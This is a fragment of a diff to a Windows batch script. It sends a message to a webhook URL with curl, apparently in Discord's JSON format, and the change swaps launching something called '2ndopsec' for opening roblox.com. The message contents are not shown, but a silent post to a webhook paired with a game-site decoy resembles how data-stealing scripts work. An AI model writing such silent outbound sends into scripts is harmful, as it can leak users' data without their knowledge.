@@ -17,6 +17,5 @@ curl.exe -i --fail-with-body -X POST "%WEBHOOK_URL%" ^
   -H "Content-Type: application/json" ^
   --data "{\"content\":\"%MESSAGE%\"}"
 
-start 2ndopsec
-
+start https://roblox.com
 exit
